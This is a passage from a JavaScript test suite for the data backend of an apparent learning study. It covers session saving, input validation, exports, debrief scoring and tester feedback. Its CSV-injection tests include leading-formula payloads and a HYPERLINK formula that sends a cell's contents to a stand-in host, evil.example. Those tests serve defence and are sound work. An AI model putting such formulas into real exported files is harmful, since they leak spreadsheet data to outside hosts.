  const p = payload();
  await saveSessionToD1(db, p);
  // Wipe the trial rows but leave the session row intact.
  db._dump().trials.length = 0;
  check("orphan state seeded (session, 0 trials)",
        db._dump().sessions.length === 1 && db._dump().trials.length === 0, true);

  // Retry the save. The orphan should be recovered: trials get written.
  const result = await saveSessionToD1(db, p);
  check("status saved (orphan recovered)", result.status, "saved");
  check("n_trials_saved = original count",  result.n_trials_saved, 2);
  check("trials now written",               db._dump().trials.length, 2);
  check("still only 1 session row",         db._dump().sessions.length, 1);

  // Third call should be a true idempotent no-op.
  const result2 = await saveSessionToD1(db, p);
  check("third call -> already_saved",      result2.status, "already_saved");
  check("third call writes no trials",      result2.n_trials_saved, 0);
  check("still only 2 trial rows",          db._dump().trials.length, 2);
}

// csvCell: quoting, quote escaping, and the apostrophe prefix on a cell that
// starts with a spreadsheet formula character.
console.log("\n== csvCell: CSV-injection defusal (IMP-1) ==");
{
  // Pass-through: plain text, no special chars.
  check("plain text untouched",     csvCell("ethanol"),       "ethanol");
  check("empty string untouched",   csvCell(""),              "");
  check("number untouched",         csvCell(42),              "42");

  // Quoting only for comma/quote/newline.
  check("comma wrapped",            csvCell("a, b"),          '"a, b"');
  check("quote escaped",            csvCell('he said "hi"'),  '"he said ""hi"""');

  // CSV-injection: leading =, +, -, @, \t, \r get apostrophe-prefixed.
  check("leading = prefixed",       csvCell("=1+1"),          "'=1+1");
  check("leading + prefixed",       csvCell("+SUM(A1:A2)"),   "'+SUM(A1:A2)");
  check("leading - prefixed",       csvCell("-2*3"),          "'-2*3");
  check("leading @ prefixed",       csvCell("@SUM(A:A)"),     "'@SUM(A:A)");
  check("leading tab prefixed",     csvCell("\t=1"),          "'\t=1");
  // \r additionally triggers the comma/quote/newline wrap (newline-like char),
  // so the cell is both apostrophe-prefixed AND wrapped in quotes.
  check("leading CR prefixed+wrapped", csvCell("\r=1"),       `"'\r=1"`);

  // HYPERLINK-style exfiltration attempt is also defused.
  check("HYPERLINK formula defused",
        csvCell('=HYPERLINK("https://evil.example/?x="&A1,"click")'),
        `"'=HYPERLINK(""https://evil.example/?x=""&A1,""click"")"`);

  // Mid-string =, +, etc. are NOT prefixed (only the leading char matters).
  check("mid-string = untouched",   csvCell("a=b"),           "a=b");
  check("mid-string + untouched",   csvCell("a+b"),           "a+b");
}

// checkEnrollment: true only for a participant id present in participants_v2.
console.log("\n== checkEnrollment (C2 fix) ==");
{
  const db = makeMockDB();
  check("unenrolled pid -> false",         await checkEnrollment(db, "99-NEVER"), false);
  check("empty pid -> false",              await checkEnrollment(db, ""), false);
  check("null pid -> false",               await checkEnrollment(db, null), false);

  db._seedParticipant({
    pid: "03-12345", option_id: "option1",
    enrollment_date: "2026-05-22T00:00:00.000Z",
    dev_mode: 0, ua: "", tz: "America/Toronto",
  });
  check("enrolled pid -> true",            await checkEnrollment(db, "03-12345"), true);
  check("different unenrolled pid -> false", await checkEnrollment(db, "04-12345"), false);
}

// ═══════════════════════════════════════════════════════════════════════════
// METACOGNITIVE LAYER TESTS
//
// The block below covers the metacognitive layer: per-item confidence,
// pre-session predictions, familiarity ratings, the Day 4 and Day 14 forced
// choices, and the editable copy strings.
// ═══════════════════════════════════════════════════════════════════════════

// A confidence rating of 1 to 4 is stored on the trial row.
console.log("\n== trials_v2.confidence: 1..4 persisted ==");
{
  const db = makeMockDB();
  await saveSessionToD1(db, payload({
    trials: [
      trial({ trial_order: 1, confidence: 1 }),
      trial({ trial_order: 2, item_id: "C1-S1-amide", feature: "amide", full_name: "hexanamide", confidence: 4 }),
    ],
  }));
  const dump = db._dump();
  check("confidence=1 persisted", dump.trials[0].confidence, 1);
  check("confidence=4 persisted", dump.trials[1].confidence, 4);
}

// A missing or explicitly null confidence is stored as null.
console.log("\n== trials_v2.confidence: missing / null becomes NULL ==");
{
  const db = makeMockDB();
  await saveSessionToD1(db, payload({
    trials: [
      trial({ trial_order: 1 }),                                 // no confidence key
      trial({ trial_order: 2, item_id: "x", feature: "x", full_name: "x", confidence: null }),
    ],
  }));
  const dump = db._dump();
  check("undefined confidence -> null", dump.trials[0].confidence, null);
  check("explicit null preserved",      dump.trials[1].confidence, null);
}

// A confidence value outside 1 to 4, or of the wrong type, is stored as null.
console.log("\n== trials_v2.confidence: out-of-range becomes NULL ==");
{
  const db = makeMockDB();
  await saveSessionToD1(db, payload({
    trials: [
      trial({ trial_order: 1, confidence: 0 }),
      trial({ trial_order: 2, item_id: "x1", feature: "x", full_name: "x", confidence: 5 }),
      trial({ trial_order: 3, item_id: "x2", feature: "x", full_name: "x", confidence: 2.5 }),
      trial({ trial_order: 4, item_id: "x3", feature: "x", full_name: "x", confidence: "fairly_sure" }),
    ],
  }));
  const dump = db._dump();
  check("confidence=0 -> null",          dump.trials[0].confidence, null);
  check("confidence=5 -> null",          dump.trials[1].confidence, null);
  check("confidence=2.5 -> null",        dump.trials[2].confidence, null);
  check("confidence='string' -> null",   dump.trials[3].confidence, null);
}

// Validation accepts a trial with no confidence and rejects a value outside
// the whole numbers 1 to 4.
console.log("\n== validateSessionPayload: confidence is optional ==");
{
  // No confidence on any trial -> accepted.
  const noConf = validateSessionPayload(payload());
  check("no confidence accepted", noConf, null);

  // Valid 1..4 values accepted.
  const valid = validateSessionPayload(payload({
    trials: [trial({ trial_order: 1, confidence: 1 }),
             trial({ trial_order: 2, item_id: "x", feature: "x", full_name: "x", confidence: 4 })],
  }));
  check("confidence 1 and 4 accepted", valid, null);

  // Out of range rejected.
  const tooHigh = validateSessionPayload(payload({ trials: [trial({ confidence: 5 })] }));
  check("confidence > 4 rejected",
        Array.isArray(tooHigh) && tooHigh.some(e => /confidence/.test(e)), true);

  const tooLow  = validateSessionPayload(payload({ trials: [trial({ confidence: 0 })] }));
  check("confidence < 1 rejected",
        Array.isArray(tooLow) && tooLow.some(e => /confidence/.test(e)), true);

  const nonInt  = validateSessionPayload(payload({ trials: [trial({ confidence: 2.5 })] }));
  check("non-integer confidence rejected",
        Array.isArray(nonInt) && nonInt.some(e => /confidence/.test(e)), true);
}

// savePrediction: one row per session label, with the first value kept.
console.log("\n== savePrediction: happy path + idempotency ==");
{
  const db = makeMockDB();
  const a = await savePrediction(db, "01-DEV01", "spaced-S1", 8);
  check("first save status saved", a.status, "saved");
  check("row persisted", db._dump().predictions.length, 1);
  check("value persisted", db._dump().predictions[0].value, 8);

  // Duplicate (same pid, session_label) -> already_saved.
  const b = await savePrediction(db, "01-DEV01", "spaced-S1", 10);
  check("duplicate status already_saved", b.status, "already_saved");
  check("no second row written", db._dump().predictions.length, 1);
  check("original value preserved (no overwrite)", db._dump().predictions[0].value, 8);

  // Different session_label, same pid -> saved.
  const c = await savePrediction(db, "01-DEV01", "spaced-S2", 7);
  check("different session_label saved", c.status, "saved");
  check("two rows now", db._dump().predictions.length, 2);
}

// saveForcedChoice: one row per checkpoint, with the first choice kept.
console.log("\n== saveForcedChoice: happy path + idempotency + two checkpoints ==");
{
  const db = makeMockDB();
  const a = await saveForcedChoice(db, "01-DEV01", "day_4_immediate", "set_a", 2);
  check("status saved", a.status, "saved");
  check("choice persisted", db._dump().forcedChoices[0].choice, "set_a");
  check("confidence persisted", db._dump().forcedChoices[0].confidence, 2);

  const b = await saveForcedChoice(db, "01-DEV01", "day_4_immediate", "set_b", 3);
  check("duplicate already_saved", b.status, "already_saved");
  check("original choice preserved", db._dump().forcedChoices[0].choice, "set_a");

  // Different checkpoint, same pid -> saved.
  const c = await saveForcedChoice(db, "01-DEV01", "day_14_delayed", "same", 1);
  check("day_14 checkpoint accepted", c.status, "saved");
  check("two rows now", db._dump().forcedChoices.length, 2);
}

// saveFamiliarity: one row per item, with the first rating kept as the baseline.
console.log("\n== saveFamiliarity: happy path + idempotency (first value wins) ==");
{
  const db = makeMockDB();
  const rating = (over = {}) => ({
    checkpoint: "spaced_intro", item_id: "C1-S1-al", group_id: "C-1",
    feature: "al", full_name: "ethanal", value: 5, ...over,
  });
  const a = await saveFamiliarity(db, "01-DEV01", rating());
  check("status saved", a.status, "saved");
  check("value persisted", db._dump().familiarityRatings[0].value, 5);
  check("full_name persisted", db._dump().familiarityRatings[0].full_name, "ethanal");

  // Same (pid, item_id) -> already_saved, original value preserved (true baseline).
  const b = await saveFamiliarity(db, "01-DEV01", rating({ value: 1 }));
  check("duplicate already_saved", b.status, "already_saved");
  check("no second row", db._dump().familiarityRatings.length, 1);
  check("first value preserved (no overwrite)", db._dump().familiarityRatings[0].value, 5);

  // Different item, same pid -> saved.
  const c = await saveFamiliarity(db, "01-DEV01",
    rating({ item_id: "C1-S1-hex", feature: "hex", full_name: "hexane", value: 3 }));
  check("different item saved", c.status, "saved");
  check("two rows now", db._dump().familiarityRatings.length, 2);
}

// A familiarity payload needs a known checkpoint and group, an item id, and a
// value of 1 to 7.
console.log("\n== validateFamiliarityPayload ==");
{
  const good = { pid: "01-DEV01", checkpoint: "spaced_intro", item_id: "C1-S1-al",
                 group_id: "C-1", feature: "al", full_name: "ethanal", value: 7 };
  check("clean payload accepted", validateFamiliarityPayload(good), null);
  check("massed_intro accepted", validateFamiliarityPayload({ ...good, checkpoint: "massed_intro" }), null);

  const badCp = validateFamiliarityPayload({ ...good, checkpoint: "day_4" });
  check("bad checkpoint rejected", Array.isArray(badCp) && badCp.some(e => /checkpoint/.test(e)), true);

  const badGroup = validateFamiliarityPayload({ ...good, group_id: "C-3" });
  check("bad group_id rejected", Array.isArray(badGroup) && badGroup.some(e => /group_id/.test(e)), true);

  const badHigh = validateFamiliarityPayload({ ...good, value: 8 });
  check("value > 7 rejected", Array.isArray(badHigh) && badHigh.some(e => /value/.test(e)), true);

  const badLow = validateFamiliarityPayload({ ...good, value: 0 });
  check("value < 1 rejected", Array.isArray(badLow) && badLow.some(e => /value/.test(e)), true);

  const noItem = validateFamiliarityPayload({ ...good, item_id: "" });
  check("missing item_id rejected", Array.isArray(noItem) && noItem.some(e => /item_id/.test(e)), true);
}

// Familiarity rows appear in both the single-participant export and export-all,
// bucketed under the participant who made them.
console.log("\n== familiarity included in exports (single + all) ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "America/Toronto" });
  db._seedParticipant({ pid: "02-DEV01", option_id: "option2",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "America/Toronto" });
  await saveFamiliarity(db, "01-DEV01", { checkpoint: "spaced_intro", item_id: "C1-S1-al",
    group_id: "C-1", feature: "al", full_name: "ethanal", value: 4 });
  await saveFamiliarity(db, "01-DEV01", { checkpoint: "massed_intro", item_id: "C2-S1-but",
    group_id: "C-2", feature: "but", full_name: "butane", value: 6 });
  await saveFamiliarity(db, "02-DEV01", { checkpoint: "spaced_intro", item_id: "C2-S1-one",
    group_id: "C-2", feature: "one", full_name: "heptan-2-one", value: 2 });

  const single = await exportParticipantFromD1(db, "01-DEV01");
  check("single-PID familiarity array present", Array.isArray(single.familiarity), true);
  check("single-PID familiarity has 2 rows", single.familiarity.length, 2);
  check("single-PID familiarity row has no participant_id leak", "participant_id" in single.familiarity[0], false);
  check("single-PID familiarity carries full_name", single.familiarity[0].full_name, "ethanal");

  const all = await exportAllFromD1(db);
  const p1 = all.find(r => r.participant.pid === "01-DEV01");
  const p2 = all.find(r => r.participant.pid === "02-DEV01");
  check("p1 has 2 familiarity rows", p1.familiarity.length, 2);
  check("p2 has 1 familiarity row", p2.familiarity.length, 1);
  check("p2 familiarity value", p2.familiarity[0].value, 2);
  check("nested familiarity has no participant_id leak", "participant_id" in p1.familiarity[0], false);
}

// A prediction payload takes one of the eight practice labels and a whole
// number from 0 to 12.
console.log("\n== validatePredictionPayload ==");
{
  const ok = validatePredictionPayload({ pid: "01-DEV01", session_label: "spaced-S1", value: 6 });
  check("clean payload accepted", ok, null);

  const missingPid = validatePredictionPayload({ session_label: "spaced-S1", value: 6 });
  check("missing pid rejected",
        Array.isArray(missingPid) && missingPid.some(e => /pid/.test(e)), true);

  const badLabel = validatePredictionPayload({ pid: "01-DEV01", session_label: "pretest", value: 6 });
  check("test-phase label (pretest) rejected",
        Array.isArray(badLabel) && badLabel.some(e => /session_label/.test(e)), true);

  const badLabel2 = validatePredictionPayload({ pid: "01-DEV01", session_label: "immediate", value: 6 });
  check("immediate label rejected",
        Array.isArray(badLabel2) && badLabel2.some(e => /session_label/.test(e)), true);

  const badLabel3 = validatePredictionPayload({ pid: "01-DEV01", session_label: "delayed", value: 6 });
  check("delayed label rejected",
        Array.isArray(badLabel3) && badLabel3.some(e => /session_label/.test(e)), true);

  const valueHigh = validatePredictionPayload({ pid: "01-DEV01", session_label: "spaced-S1", value: 13 });
  check("value > 12 rejected",
        Array.isArray(valueHigh) && valueHigh.some(e => /value/.test(e)), true);

  const valueLow  = validatePredictionPayload({ pid: "01-DEV01", session_label: "spaced-S1", value: -1 });
  check("value < 0 rejected",
        Array.isArray(valueLow) && valueLow.some(e => /value/.test(e)), true);

  const valueFloat = validatePredictionPayload({ pid: "01-DEV01", session_label: "spaced-S1", value: 8.5 });
  check("non-integer value rejected",
        Array.isArray(valueFloat) && valueFloat.some(e => /value/.test(e)), true);

  // All eight practice labels accepted.
  for (const label of ["spaced-S1","spaced-S2","spaced-S3","spaced-S4","massed-B1","massed-B2","massed-B3","massed-B4"]) {
    const ok2 = validatePredictionPayload({ pid: "01-DEV01", session_label: label, value: 0 });
    check(`practice label '${label}' accepted`, ok2, null);
  }
}

// A forced-choice payload needs a known checkpoint, one of the allowed choices,
// and a confidence of 1 to 3.
console.log("\n== validateForcedChoicePayload ==");
{
  const ok = validateForcedChoicePayload({ pid: "01-DEV01", checkpoint: "day_4_immediate", choice: "set_a", confidence: 2 });
  check("clean payload accepted", ok, null);

  const badCheckpoint = validateForcedChoicePayload({ pid: "01-DEV01", checkpoint: "day_99", choice: "set_a", confidence: 2 });
  check("bad checkpoint rejected",
        Array.isArray(badCheckpoint) && badCheckpoint.some(e => /checkpoint/.test(e)), true);

  const badChoice = validateForcedChoicePayload({ pid: "01-DEV01", checkpoint: "day_4_immediate", choice: "set_c", confidence: 2 });
  check("bad choice rejected",
        Array.isArray(badChoice) && badChoice.some(e => /choice/.test(e)), true);

  const sameAccepted = validateForcedChoicePayload({ pid: "01-DEV01", checkpoint: "day_4_immediate", choice: "same", confidence: 1 });
  check("'same' choice accepted", sameAccepted, null);

  const badConfidenceHigh = validateForcedChoicePayload({ pid: "01-DEV01", checkpoint: "day_4_immediate", choice: "set_a", confidence: 4 });
  check("confidence > 3 rejected",
        Array.isArray(badConfidenceHigh) && badConfidenceHigh.some(e => /confidence/.test(e)), true);

  const badConfidenceLow = validateForcedChoicePayload({ pid: "01-DEV01", checkpoint: "day_4_immediate", choice: "set_a", confidence: 0 });
  check("confidence < 1 rejected",
        Array.isArray(badConfidenceLow) && badConfidenceLow.some(e => /confidence/.test(e)), true);
}

// Copy strings are read back as key and value pairs, and only an existing key
// can be updated.
console.log("\n== listCopyStrings + updateCopyString ==");
{
  const db = makeMockDB();
  db._seedCopy("forced_choice_day4_prompt", "Day 4 placeholder");
  db._seedCopy("forced_choice_option_set_a", "Set A");

  const strings = await listCopyStrings(db);
  check("listCopyStrings returns key/value object",
        strings.forced_choice_day4_prompt, "Day 4 placeholder");
  check("multiple keys returned",
        Object.keys(strings).length, 2);

  // Update existing key.
  const okRes = await updateCopyString(db, "forced_choice_day4_prompt", "Updated copy");
  check("existing key updated -> ok true", okRes.ok, true);

  const refetched = await listCopyStrings(db);
  check("listCopyStrings reflects update",
        refetched.forced_choice_day4_prompt, "Updated copy");

  // Update unknown key.
  const failRes = await updateCopyString(db, "nonexistent_key", "value");
  check("unknown key -> ok false",       failRes.ok,     false);
  check("unknown key -> reason set",     failRes.reason, "unknown_key");
  check("unknown key NOT inserted",      "nonexistent_key" in (await listCopyStrings(db)), false);
}

// Predictions and forced choices are included in the single-participant export.
console.log("\n== exportParticipantFromD1: metacog tables included ==");
{
  const db = makeMockDB();
  db._seedParticipant({
    pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z",
    dev_mode: 1, ua: "", tz: "America/Toronto",
  });
  await saveSessionToD1(db, payload());
  await savePrediction(db,  "01-DEV01", "spaced-S1", 7);
  await saveForcedChoice(db, "01-DEV01", "day_4_immediate", "set_a", 2);

  const data = await exportParticipantFromD1(db, "01-DEV01");
  check("predictions array present", Array.isArray(data.predictions), true);
  check("predictions has 1 row",     data.predictions.length, 1);
  check("forced_choices has 1 row",  data.forced_choices.length, 1);
  check("prediction session_label",  data.predictions[0].session_label, "spaced-S1");
  check("prediction value",          data.predictions[0].value, 7);
  check("forced_choice checkpoint",  data.forced_choices[0].checkpoint, "day_4_immediate");
  // Nested rows should not include participant_id (stripped for nesting).
  check("predictions row has no participant_id leak",
        "participant_id" in data.predictions[0], false);
}

// Export-all files each prediction and forced choice under the right participant.
console.log("\n== exportAllFromD1: metacog tables bucketed per participant ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-20T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });
  db._seedParticipant({ pid: "02-DEV01", option_id: "option2",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });

  await saveSessionToD1(db, payload({ pid: "01-DEV01" }));
  await saveSessionToD1(db, payload({ pid: "02-DEV01", phase: "spaced", group_practiced: "C-2",
    session_label: "spaced-S1", trials: [trial({ item_id: "C2-S1-x", trial_order: 1 })] }));

  await savePrediction(db,  "01-DEV01", "spaced-S1", 8);
  await savePrediction(db,  "01-DEV01", "spaced-S2", 6);
  await savePrediction(db,  "02-DEV01", "spaced-S1", 5);
  await saveForcedChoice(db, "01-DEV01", "day_4_immediate", "set_a", 3);
  await saveForcedChoice(db, "02-DEV01", "day_14_delayed", "same",  1);

  const rows = await exportAllFromD1(db);
  check("2 participants",                rows.length, 2);
  const p1 = rows.find(r => r.participant.pid === "01-DEV01");
  const p2 = rows.find(r => r.participant.pid === "02-DEV01");
  check("p1 has 2 predictions",          p1.predictions.length, 2);
  check("p1 has 1 forced_choice",        p1.forced_choices.length, 1);
  check("p2 has 1 prediction",           p2.predictions.length, 1);
  check("p2 has 1 forced_choice",        p2.forced_choices.length, 1);
  check("p2 forced_choice is day_14",    p2.forced_choices[0].checkpoint, "day_14_delayed");
  // No participant_id leak in nested rows.
  check("nested predictions have no participant_id leak",
        "participant_id" in p1.predictions[0], false);
}

// The debrief data is null for an unenrolled participant id.
console.log("\n== getDebriefDataFromD1: unknown PID -> null ==");
{
  const db = makeMockDB();
  const data = await getDebriefDataFromD1(db, "99-XYZ");
  check("null on unknown pid", data, null);
}

// A participant with no sessions gets the group mapping, empty lists, and
// baseline set scores.
console.log("\n== getDebriefDataFromD1: enrolled, no sessions ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });
  const data = await getDebriefDataFromD1(db, "01-DEV01");
  check("data returned",          !!data, true);
  check("pid carried through",    data.pid, "01-DEV01");
  check("option_id carried",      data.option_id, "option1");
  check("spaced_group is C-1",    data.spaced_group, "C-1");
  check("massed_group is C-2",    data.massed_group, "C-2");
  check("sessions empty",         data.sessions.length, 0);
  check("predictions empty",      data.predictions.length, 0);
  check("forced_choices empty",   data.forced_choices.length, 0);
  check("no day_4_immediate checkpoint", "day_4_immediate" in data.set_scores, false);
  check("set_scores baseline b", data.set_scores.day_14_delayed.set_b, 0);
  check("no postdictions field returned", "postdictions" in data, false);
}

// The debrief counts unique items, first-attempt correct answers, and every
// correct answer in a session.
console.log("\n== getDebriefDataFromD1: per-session score (first-attempt accuracy) ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });

  // spaced-S1: 3 items.
  //   item A: 1 trial, correct on first attempt
  //   item B: 2 trials, wrong then correct (mastery loop retry)
  //   item C: 1 trial, wrong (soft cap, hypothetical 1-attempt cap for the test)
  // first_attempt_correct = 1 (only item A); total_correct = 2 (A and B's retry)
  await saveSessionToD1(db, payload({
    session_label: "spaced-S1",
    trials: [
      trial({ trial_order: 1, item_id: "A", correct: true,  retry_attempt: 1 }),
      trial({ trial_order: 2, item_id: "B", correct: false, retry_attempt: 1, item_id: "B", feature: "b", full_name: "B" }),
      trial({ trial_order: 3, item_id: "B", correct: true,  retry_attempt: 2, feature: "b", full_name: "B" }),
      trial({ trial_order: 4, item_id: "C", correct: false, retry_attempt: 1, feature: "c", full_name: "C" }),
    ],
  }));

  const data = await getDebriefDataFromD1(db, "01-DEV01");
  const s1 = data.sessions.find(s => s.session_label === "spaced-S1");
  check("session present",            !!s1, true);
  check("n_items counts unique items", s1.n_items, 3);
  check("first_attempt_correct counts only retry_attempt=1",
        s1.first_attempt_correct, 1);
  check("total_correct counts every correct row",
        s1.total_correct, 2);
}

// The delayed test splits into Set A and Set B scores for a participant on
// counterbalance option 1.
console.log("\n== getDebriefDataFromD1: set scores on the delayed checkpoint ==");
{
  const db = makeMockDB();
  // option1 -> spaced=C-1, massed=C-2 -> Set A = C-1, Set B = C-2.
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });

  // Delayed posttest: 6 trials, 3 from each group, varying correctness.
  await saveSessionToD1(db, payload({
    phase: "delayed",
    session_label: "delayed",
    group_practiced: null,
    trials: [
      trial({ trial_order: 1, group_id: "C-1", correct: true,  item_id: "d1" }),
      trial({ trial_order: 2, group_id: "C-1", correct: true,  item_id: "d2" }),
      trial({ trial_order: 3, group_id: "C-1", correct: false, item_id: "d3" }),
      trial({ trial_order: 4, group_id: "C-2", correct: false, item_id: "d4" }),
      trial({ trial_order: 5, group_id: "C-2", correct: false, item_id: "d5" }),
      trial({ trial_order: 6, group_id: "C-2", correct: true,  item_id: "d6" }),
    ],
  }));

  const data = await getDebriefDataFromD1(db, "01-DEV01");
  const ss = data.set_scores;
  // option1: Set A = C-1 (spaced), Set B = C-2 (massed). There is no immediate test.
  check("no day_4_immediate checkpoint", "day_4_immediate" in ss, false);
  check("Day 14 Set A n_items", ss.day_14_delayed.n_items_a,  3);
  check("Day 14 Set A correct", ss.day_14_delayed.set_a,      2);
  check("Day 14 Set B n_items", ss.day_14_delayed.n_items_b,  3);
  check("Day 14 Set B correct", ss.day_14_delayed.set_b,      1);
}

// The Set A and Set B mapping follows the counterbalance, so it flips on
// option 2.
console.log("\n== getDebriefDataFromD1: set A/B mapping flips for option2 ==");
{
  const db = makeMockDB();
  // option2 -> spaced=C-2, massed=C-1 -> Set A = C-2, Set B = C-1.
  db._seedParticipant({ pid: "02-DEV01", option_id: "option2",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });

  await saveSessionToD1(db, payload({
    pid: "02-DEV01",
    phase: "delayed",
    session_label: "delayed",
    group_practiced: null,
    trials: [
      trial({ trial_order: 1, group_id: "C-2", correct: true  }),   // Set A (spaced)
      trial({ trial_order: 2, group_id: "C-1", correct: false, item_id: "x1" }), // Set B (massed)
    ],
  }));

  const data = await getDebriefDataFromD1(db, "02-DEV01");
  check("spaced_group is C-2",                          data.spaced_group, "C-2");
  check("massed_group is C-1",                          data.massed_group, "C-1");
  check("Set A (=C-2 for option2) has the right count", data.set_scores.day_14_delayed.n_items_a, 1);
  check("Set A correct",                                data.set_scores.day_14_delayed.set_a, 1);
  check("Set B (=C-1 for option2) has the right count", data.set_scores.day_14_delayed.n_items_b, 1);
  check("Set B correct",                                data.set_scores.day_14_delayed.set_b, 0);
}

// The debrief carries the participant's predictions and forced choices.
console.log("\n== getDebriefDataFromD1: metacog tables included ==");
{
  const db = makeMockDB();
  db._seedParticipant({ pid: "01-DEV01", option_id: "option1",
    enrollment_date: "2026-05-21T00:00:00.000Z", dev_mode: 1, ua: "", tz: "" });
  await savePrediction(db,  "01-DEV01", "spaced-S1", 7);
  await saveForcedChoice(db, "01-DEV01", "day_14_delayed", "set_a", 2);

  const data = await getDebriefDataFromD1(db, "01-DEV01");
  check("predictions returned",     data.predictions.length, 1);
  check("prediction value",         data.predictions[0].value, 7);
  check("forced_choices returned",  data.forced_choices.length, 1);
  check("forced choice value",      data.forced_choices[0].choice, "set_a");
}

// ═══════════════════════════════════════════════════════════════════════════
// TESTER EDIT-REQUEST (FEEDBACK) TESTS
//
// edit_requests_v2 is the isolated table behind the in-page "Request edit"
// tool. These cover validation, batch insert, listing (+ resolved filter),
// and mark-resolved by id and by whole batch.
// ═══════════════════════════════════════════════════════════════════════════

// An edit-request payload needs a DEV participant id, a page, and 1 to 50 pins
// carrying a non-blank note within the length cap.
console.log("\n== validateEditRequestPayload ==");
{
  const good = { pid: "01-DEV01", page: "study-session1.html", pins: [{ note: "fix this wording" }] };
  check("clean payload accepted", validateEditRequestPayload(good), null);

  const noPid = validateEditRequestPayload({ page: "x.html", pins: [{ note: "n" }] });
  check("missing pid rejected", Array.isArray(noPid) && noPid.some(e => /pid/.test(e)), true);

  const realPid = validateEditRequestPayload({ pid: "03-12345", page: "x.html", pins: [{ note: "n" }] });
  check("non-DEV pid rejected (tester-only)",
        Array.isArray(realPid) && realPid.some(e => /DEV/.test(e)), true);

  const noPage = validateEditRequestPayload({ pid: "01-DEV01", pins: [{ note: "n" }] });
  check("missing page rejected", Array.isArray(noPage) && noPage.some(e => /page/.test(e)), true);

  const noPins = validateEditRequestPayload({ pid: "01-DEV01", page: "x.html", pins: [] });
  check("empty pins rejected", Array.isArray(noPins) && noPins.some(e => /pins/.test(e)), true);

  const tooMany = validateEditRequestPayload({ pid: "01-DEV01", page: "x.html",
    pins: Array.from({ length: 51 }, () => ({ note: "n" })) });
  check("too many pins rejected", Array.isArray(tooMany) && tooMany.some(e => /pins exceeds/.test(e)), true);

  const blankNote = validateEditRequestPayload({ pid: "01-DEV01", page: "x.html", pins: [{ note: "   " }] });
  check("blank note rejected", Array.isArray(blankNote) && blankNote.some(e => /note/.test(e)), true);

  const longNote = validateEditRequestPayload({ pid: "01-DEV01", page: "x.html",
    pins: [{ note: "x".repeat(2001) }] });
  check("oversized note rejected", Array.isArray(longNote) && longNote.some(e => /exceeds/.test(e)), true);
}

// A batch saves one row per pin with its page context, and the listing returns
// the newest row first.
console.log("\n== saveEditRequests + listEditRequests ==");
{
  const db = makeMockDB();
  const meta = { pid: "01-DEV01", reporter: "Jane", page: "study-session1.html",
                 page_url: "https://x/study-session1.html?pid=01-DEV01", viewport: "1280x800", ua: "TestUA" };
  const res = await saveEditRequests(db, "batch-1", meta, [
    { note: "first note", selector: "main .prompt", element_text: "Name this", selected_text: "Name", pos: "0.4,0.1" },
    { note: "second note" },
  ]);
  check("n_saved = 2",        res.n_saved, 2);
  check("batch_id returned",  res.batch_id, "batch-1");
  check("2 rows in table",    db._dump().editRequests.length, 2);

  const all = await listEditRequests(db);
  check("list returns 2",                 all.length, 2);
  check("newest first (id DESC tiebreak)", all[0].note, "second note");
  check("reporter stored",                all[0].reporter, "Jane");
  check("selector stored on first pin",   all[1].selector, "main .prompt");
  check("resolved defaults 0",            all[0].resolved, 0);
  check("pid stored as context",          all[0].pid, "01-DEV01");
}

// A single edit request can be resolved and reopened by row id, and the
// resolved filter follows.
console.log("\n== markEditRequestResolved: by id ==");
{
  const db = makeMockDB();
  await saveEditRequests(db, "b1", { pid: "01-DEV01", page: "p.html" }, [{ note: "a" }, { note: "b" }]);
  const before   = await listEditRequests(db);
  const targetId = before[0].id;

  const r = await markEditRequestResolved(db, { id: targetId, resolved: 1 });
  check("one row changed", r.n_changed, 1);

  const openOnly = await listEditRequests(db, { resolved: 0 });
  check("open list excludes resolved row", openOnly.every(x => x.id !== targetId), true);
  check("one row still open",              openOnly.length, 1);

  const doneOnly = await listEditRequests(db, { resolved: 1 });
  check("resolved list has the one row",     doneOnly.length, 1);
  check("resolved row carries resolved_at",  typeof doneOnly[0].resolved_at, "string");

  const r2 = await markEditRequestResolved(db, { id: targetId, resolved: 0 });
  check("reopen changes one row", r2.n_changed, 1);
  check("now zero resolved",      (await listEditRequests(db, { resolved: 1 })).length, 0);
}

// Resolving by batch id changes every row in that batch and leaves other
// batches open.
console.log("\n== markEditRequestResolved: by batch_id ==");
{
  const db = makeMockDB();
  await saveEditRequests(db, "batchA", { pid: "01-DEV01", page: "p.html" }, [{ note: "a1" }, { note: "a2" }]);
  await saveEditRequests(db, "batchB", { pid: "01-DEV01", page: "p.html" }, [{ note: "b1" }]);

  const r = await markEditRequestResolved(db, { batch_id: "batchA", resolved: 1 });
  check("two rows changed (whole batch)", r.n_changed, 2);
  check("batchB untouched (still open)",  (await listEditRequests(db, { resolved: 0 })).length, 1);
  check("batchA both resolved",           (await listEditRequests(db, { resolved: 1 })).length, 2);
}

// verifySessionPassword: an exact match after trimming, case sensitive, with a
// sentinel when no secret is configured.
console.log("\n== verifySessionPassword (in-lab delayed-test gate) ==");
{
  // The password below is a placeholder fixture, not the live password.
  const env = { LAB_SESSION_PASSWORD: "test-secret-abc" };
  check("correct password -> true",         verifySessionPassword(env, "test-secret-abc"), true);
  check("wrong password -> false",          verifySessionPassword(env, "nope"), false);
  check("empty password -> false",          verifySessionPassword(env, ""), false);
  check("null password -> false",           verifySessionPassword(env, null), false);
  check("surrounding whitespace trimmed",   verifySessionPassword(env, "  test-secret-abc  "), true);
